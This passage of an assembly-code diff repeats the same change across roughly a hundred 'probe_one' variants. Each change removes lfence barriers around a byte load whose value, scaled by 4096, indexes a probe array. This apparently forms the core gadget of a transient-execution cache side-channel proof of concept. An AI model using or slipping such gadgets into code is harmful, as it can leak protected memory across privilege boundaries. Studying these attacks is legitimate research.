 	jmp	.Lprobe_one_win0_continue
 ## Variant 99
@@ -2202,10 +2006,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 100
@@ -2213,10 +2015,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 101
@@ -2224,10 +2024,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 102
@@ -2235,10 +2033,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 103
@@ -2246,10 +2042,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 104
@@ -2257,10 +2051,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 105
@@ -2268,10 +2060,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 106
@@ -2279,10 +2069,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 107
@@ -2290,10 +2078,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 108
@@ -2301,10 +2087,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 109
@@ -2312,10 +2096,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 110
@@ -2323,10 +2105,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 111
@@ -2334,10 +2114,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 112
@@ -2345,10 +2123,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 113
@@ -2356,10 +2132,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 114
@@ -2367,10 +2141,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 115
@@ -2378,10 +2150,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 116
@@ -2389,10 +2159,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 117
@@ -2400,10 +2168,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 118
@@ -2411,10 +2177,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 119
@@ -2422,10 +2186,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 120
@@ -2433,10 +2195,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 121
@@ -2444,10 +2204,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 122
@@ -2455,10 +2213,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 123
@@ -2466,10 +2222,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 124
@@ -2477,10 +2231,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 125
@@ -2488,10 +2240,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 126
@@ -2499,10 +2249,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 127
@@ -2510,10 +2258,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 128
@@ -2521,10 +2267,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 129
@@ -2532,10 +2276,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 130
@@ -2543,10 +2285,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 131
@@ -2554,10 +2294,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 132
@@ -2565,10 +2303,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 133
@@ -2576,10 +2312,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 134
@@ -2587,10 +2321,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 135
@@ -2598,10 +2330,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 136
@@ -2609,10 +2339,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 137
@@ -2620,10 +2348,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 138
@@ -2631,10 +2357,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 139
@@ -2642,10 +2366,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 140
@@ -2653,10 +2375,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 141
@@ -2664,10 +2384,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 142
@@ -2675,10 +2393,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 143
@@ -2686,10 +2402,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 144
@@ -2697,10 +2411,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 145
@@ -2708,10 +2420,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 146
@@ -2719,10 +2429,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 147
@@ -2730,10 +2438,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 148
@@ -2741,10 +2447,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 149
@@ -2752,10 +2456,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 150
@@ -2763,10 +2465,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 151
@@ -2774,10 +2474,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 152
@@ -2785,10 +2483,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 153
@@ -2796,10 +2492,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 154
@@ -2807,10 +2501,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 155
@@ -2818,10 +2510,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 156
@@ -2829,10 +2519,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 157
@@ -2840,10 +2528,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 158
@@ -2851,10 +2537,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 159
@@ -2862,10 +2546,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 160
@@ -2873,10 +2555,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 161
@@ -2884,10 +2564,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 162
@@ -2895,10 +2573,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 163
@@ -2906,10 +2582,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 164
@@ -2917,10 +2591,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 165
@@ -2928,10 +2600,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 166
@@ -2939,10 +2609,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 167
@@ -2950,10 +2618,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 168
@@ -2961,10 +2627,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 169
@@ -2972,10 +2636,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 170
@@ -2983,10 +2645,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 171
@@ -2994,10 +2654,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 172
@@ -3005,10 +2663,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 173
@@ -3016,10 +2672,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 174
@@ -3027,10 +2681,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 175
@@ -3038,10 +2690,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 176
@@ -3049,10 +2699,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 177
@@ -3060,10 +2708,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 178
@@ -3071,10 +2717,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 179
@@ -3082,10 +2726,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 180
@@ -3093,10 +2735,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 181
@@ -3104,10 +2744,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 182
@@ -3115,10 +2753,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 183
@@ -3126,10 +2762,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 184
@@ -3137,10 +2771,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 185
@@ -3148,10 +2780,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 186
@@ -3159,10 +2789,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 187
@@ -3170,10 +2798,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 188
@@ -3181,10 +2807,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 189
@@ -3192,10 +2816,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 190
@@ -3203,10 +2825,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 191
@@ -3214,10 +2834,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 192
@@ -3225,10 +2843,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 193
@@ -3236,10 +2852,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 194
@@ -3247,10 +2861,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 195
@@ -3258,10 +2870,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 196
@@ -3269,10 +2879,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 197
@@ -3280,10 +2888,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 198
@@ -3291,10 +2897,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 199
@@ -3302,10 +2906,8 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	lfence
 	shlq	$0xc, %rax
 	jz	92b
-	lfence
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 200
